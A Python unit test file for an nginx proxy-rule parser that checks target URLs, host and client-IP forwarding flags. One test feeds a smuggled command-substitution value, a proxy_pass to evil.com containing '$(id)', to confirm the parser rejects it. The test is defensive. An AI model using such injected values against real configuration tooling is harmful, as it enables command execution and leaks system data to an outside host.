import unittest

from app.nginx.proxyparse import parse_proxy_rules


SAMPLE = """
server {
    # panel-proxy api
    location /api {
        proxy_pass http://10.0.0.5:9000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
    location /plain {
        try_files $uri =404;
    }
    location /bare {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
    }
}
"""


class ProxyParseTest(unittest.TestCase):
    def test_reads_real_target_and_client_ip_flag(self):
        rules = parse_proxy_rules(SAMPLE)
        self.assertEqual(rules[0]["path"], "/api")
        self.assertEqual(rules[0]["target_url"], "http://10.0.0.5:9000")
        self.assertEqual(rules[0]["name"], "api")
        self.assertTrue(rules[0]["forward_ip"])
        self.assertTrue(rules[0]["preserve_host"])
        self.assertEqual(rules[1]["target_url"], "http://127.0.0.1:8080")
        self.assertFalse(rules[1]["forward_ip"])

    def test_ignores_unsafe_proxy_pass(self):
        text = "location /api { proxy_pass http://evil.com/$(id); }"
        self.assertEqual(parse_proxy_rules(text), [])


if __name__ == "__main__":
    unittest.main()
